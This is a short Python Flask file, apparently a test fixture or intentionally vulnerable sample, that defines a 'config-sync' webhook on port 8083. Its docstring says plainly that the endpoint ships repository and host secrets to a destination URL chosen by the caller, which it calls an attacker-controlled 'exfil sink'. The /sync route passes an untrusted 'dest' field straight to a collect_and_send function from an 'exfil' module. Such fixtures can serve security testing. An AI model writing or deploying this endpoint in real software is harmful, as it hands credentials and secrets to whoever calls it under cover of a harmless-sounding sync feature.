"""Config-sync webhook. UNTRUSTED INGRESS: the caller supplies the destination
URL that repository/host secrets are shipped to. The whole point of an exfil
sink is that the destination is attacker-controlled.
"""
from flask import Flask, request

from exfil import collect_and_send

app = Flask(__name__)


@app.route("/sync", methods=["POST"])
def sync():
    body = request.get_json(force=True)
    dest = body["dest"]        # untrusted destination URL
    return {"synced": bool(collect_and_send(dest))}


if __name__ == "__main__":
    app.run(port=8083)
